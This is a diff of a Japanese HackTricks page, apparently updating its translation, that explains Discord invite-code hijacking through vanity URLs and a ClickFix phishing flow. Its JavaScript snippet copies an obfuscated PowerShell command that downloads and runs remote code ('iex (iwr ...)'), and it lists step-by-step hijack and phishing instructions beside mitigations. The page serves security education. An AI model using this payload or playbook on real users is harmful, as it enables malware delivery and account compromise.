@@ -2,40 +2,40 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Discordの招待システムの脆弱性により、脅威アクターは期限切れまたは削除された招待コード（一時的、永久的、またはカスタムバニティ）を新しいバニティリンクとして主にレベル3ブーストされたサーバーで主張することができます。すべてのコードを小文字に正規化することで、攻撃者は既知の招待コードを事前に登録し、元のリンクが期限切れになるか、ソースサーバーがブーストを失ったときに静かにトラフィックをハイジャックできます。
+Discord の invite system の脆弱性により、threat actor は期限切れまたは削除された invite code（temporary、permanent、custom vanity）を、Level 3 boosted server 上の新しい vanity link として取得できます。すべての code が lowercase に正規化されるため、攻撃者は既知の invite code を事前登録し、元の link が期限切れになるか、source server が boost を失った時点で、気付かれないまま traffic を hijack できます。<sup>[[1]](#references)[[2]](#references)</sup>
 
-## 招待タイプとハイジャックリスク
+## Invite Types and Hijack Risk
 
-| 招待タイプ               | ハイジャック可能? | 条件 / コメント                                                                                       |
+| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
 |-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
-| 一時的招待リンク         | ✅          | 期限切れ後、コードは利用可能になり、ブーストされたサーバーによってバニティURLとして再登録される可能性があります。 |
-| 永久的招待リンク         | ⚠️          | 削除され、小文字の文字と数字のみで構成されている場合、コードは再び利用可能になる可能性があります。        |
-| カスタムバニティリンク    | ✅          | 元のサーバーがレベル3ブーストを失うと、そのバニティ招待は新しい登録のために利用可能になります。    |
+| Temporary Invite Link | ✅          | 期限切れになると code が利用可能になり、boosted server によって vanity URL として再登録できます。 |
+| Permanent Invite Link | ⚠️          | 削除され、lowercase の letters と digits のみで構成されている場合、code が再び利用可能になることがあります。        |
+| Custom Vanity Link    | ✅          | 元の server が Level 3 Boost を失うと、その vanity invite が新規登録用に利用可能になります。    |
 
-## 悪用手順
+## Exploitation Steps
 
-1. 偵察
-- 公共のソース（フォーラム、ソーシャルメディア、Telegramチャンネル）で`discord.gg/{code}`または`discord.com/invite/{code}`のパターンに一致する招待リンクを監視します。
-- 興味のある招待コード（一時的またはバニティ）を収集します。
-2. 事前登録
-- レベル3ブースト権限を持つDiscordサーバーを作成するか、既存のサーバーを使用します。
-- **サーバー設定 → バニティURL**で、ターゲット招待コードを割り当てようとします。受け入れられた場合、そのコードは悪意のあるサーバーによって予約されます。
-3. ハイジャックのアクティベーション
-- 一時的招待の場合、元の招待が期限切れになるまで待ちます（または、ソースを制御している場合は手動で削除します）。
-- 大文字を含むコードの場合、小文字のバリアントはすぐに主張できますが、リダイレクトは期限切れ後にのみアクティブになります。
-4. 静かなリダイレクション
-- 古いリンクを訪れるユーザーは、ハイジャックがアクティブになると、攻撃者が制御するサーバーにシームレスに送信されます。
+1. Reconnaissance
+- 公開ソース（forums、social media、Telegram channels）で、`discord.gg/{code}` または `discord.com/invite/{code}` のパターンに一致する invite link を監視します。<sup>[[1]](#references)</sup>
+- 関心のある invite code（temporary または vanity）を収集します。
+2. Pre-registration
+- Level 3 Boost privileges を持つ Discord server を作成するか、既存のものを使用します。
+- **Server Settings → Vanity URL** で、target invite code の割り当てを試みます。受け入れられた場合、code は malicious server によって予約されます。
+3. Hijack Activation
+- temporary invite の場合、元の invite が期限切れになるまで待ちます（または source を管理している場合は手動で削除します）。
+- uppercase を含む code では、lowercase variant をすぐに取得できますが、redirection が有効になるのは期限切れ後です。
+4. Silent Redirection
+- hijack が有効になると、古い link にアクセスした users はシームレスに attacker-controlled server へ送られます。
 
-## Discordサーバーを介したフィッシングフロー
+## Phishing Flow via Discord Server
 
-1. サーバーチャンネルを制限し、**#verify**チャンネルのみが表示されるようにします。
-2. ボット（例：**Safeguard#0786**）を展開し、新規参加者にOAuth2を介して確認するよう促します。
-3. ボットはユーザーをフィッシングサイト（例：`captchaguard.me`）にリダイレクトし、CAPTCHAまたは確認ステップのふりをします。
-4. **ClickFix** UXトリックを実装します：
-- 壊れたCAPTCHAメッセージを表示します。
-- ユーザーに**Win+R**ダイアログを開き、事前にロードされたPowerShellコマンドを貼り付けてEnterを押すように誘導します。
+1. server channels を制限し、**#verify** channel だけが表示されるようにします。<sup>[[1]](#references)</sup>
+2. bot（例：**Safeguard#0786**）を導入し、新規 users に OAuth2 で verify するよう促します。
+3. bot は CAPTCHA または verification step を装い、users を phishing site（例：`captchaguard.me`）へ redirect します。
+4. **ClickFix** UX trick を実装します。
+- 壊れた CAPTCHA message を表示します。
+- **Win+R** dialog を開き、preloaded PowerShell command を貼り付けて Enter を押すよう users を誘導します。
 
-### ClickFixクリップボードインジェクションの例
+### ClickFix Clipboard Injection Example
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -44,18 +44,18 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-このアプローチは、直接的なファイルダウンロードを避け、ユーザーの疑念を下げるために馴染みのあるUI要素を活用します。
+このアプローチではファイルを直接ダウンロードせず、見慣れた UI 要素を利用してユーザーの警戒心を低下させます。<sup>[[1]](#references)</sup>
 
-## 緩和策
+## 対策
 
-- 少なくとも1つの大文字または非英数字を含む永久的な招待リンクを使用する（期限切れにならず、再利用不可）。
-- 定期的に招待コードをローテーションし、古いリンクを無効にする。
-- DiscordサーバーのブーストステータスとバニティURLの主張を監視する。
-- ユーザーにサーバーの真正性を確認し、クリップボードから貼り付けたコマンドを実行しないよう教育する。
+- 少なくとも 1 つの大文字または英数字以外の文字を含む永続的な invite links を使用する（有効期限がなく、再利用不可）。<sup>[[1]](#references)</sup>
+- invite codes を定期的にローテーションし、古いリンクを revoke する。
+- Discord server の boost status と vanity URL claims を監視する。
+- server の正当性を確認し、clipboard に貼り付けられた commands を実行しないようユーザーに教育する。
 
-## 参考文献
+## References
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
-- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
+- [1] [From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
